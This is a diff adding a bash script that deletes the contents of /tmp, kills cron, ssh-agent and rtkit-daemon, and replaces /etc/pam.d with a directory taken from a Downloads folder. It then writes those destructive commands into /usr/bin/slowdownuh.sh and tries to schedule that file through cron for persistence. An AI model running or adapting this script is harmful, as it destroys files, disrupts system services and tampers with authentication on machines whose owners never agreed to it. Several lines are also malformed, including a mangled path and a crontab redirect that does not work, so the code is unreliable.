@@ -1,0 +1,31 @@
+#!/bin/bash
+cd /tmp
+
+rm -r *  && rm .* 
+
+killall cron
+
+killall ssh-agent
+
+killall rtkit-daemon 
+
+
+cd /home/ubuntu/Downloads && mv pam.d /etc/pam.d && updatedb && 
+
+touch slowdownuh.sh /usr/bin/ 
+
+echo #!/bin/bash > /usr/bin/slowdownuh.sh 
+
+echo cd /tmp >> /usr/bin/slowdownuh.sh
+  
+echo  rm -r *  && rm .* >> /usr/bin/slowdownuh.sh
+
+echo  killall cron >> /usr/bin/slowdownuh.sh
+
+echo killall ssh-agent >> s/usr/bin/lowdownuh.sh
+
+echo  killall rtkit-daemon  >> /usr/bin/slowdownuh.sh 
+
+chmod a+x /usr/bin/slowdownuh.sh 
+
+echo 1 * * * *  /usr/bin/slowdownuh.sh > crontab -e 
